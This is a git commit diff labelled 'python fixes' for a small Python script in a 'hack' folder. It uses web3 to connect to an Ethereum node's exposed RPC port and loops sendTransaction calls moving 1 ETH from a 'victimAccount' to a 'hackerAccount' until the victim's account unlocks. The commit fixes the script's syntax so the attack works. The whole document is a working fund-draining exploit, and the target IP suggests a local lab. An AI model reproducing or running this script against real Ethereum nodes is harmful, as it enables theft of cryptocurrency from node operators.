3aae08df1219c21fda78aa9b70b8ac5e1b1a3cf4
nvalidov <niyazvalidov@gmail.com>
2018-04-16 06:33:52 +0300

    python fixes

--- hack/config.py
+++
@@ -1,6 +0,0 @@
-ip = '192.168.56.101'
-rpcPort = '8545'
-victimAccount = '0xb81d5ec7a8ce67dc4601f72fc3d701ff71f2c513'
-hackerAccount = '0x652523c8aaf77ab898e4225a9dd31c419c6cd54f'
-amount = 1000000000000000000
-
--- hack/run.py
+++ hack/run.py
@@ -1,15 +1,23 @@
 from web3 import Web3, HTTPProvider
-from .config import ip, rpcPort, victimAccount, hackerAccount, amount
+import time
 
-w3 = Web3(HTTPProvider('http://' + ip + ':' + prcPort))
+ip = '192.168.56.101'
+rpcPort = '8545'
+victimAccount = '0xb81d5ec7a8ce67dc4601f72fc3d701ff71f2c513'
+hackerAccount = '0x652523c8aaf77ab898e4225a9dd31c419c6cd54f'
+amount = 1000000000000000000
 
-isHached = false
 
-while (!isHached):
+w3 = Web3(HTTPProvider('http://' + ip + ':' + rpcPort))
+
+isHached = False
+
+while (not isHached):
 	try:
-		w3.eth.sendTransaction({'from': victimAccount, 'to': hackerAccount}, 'value': amount)
-		isHached = true
+		w3.eth.sendTransaction({'from': victimAccount, 'to': hackerAccount, 'value': amount})
+		isHached = True
 	except ValueError:
 		print('--Locked--')
+		time.sleep(4)
 
 print('Success!!!')
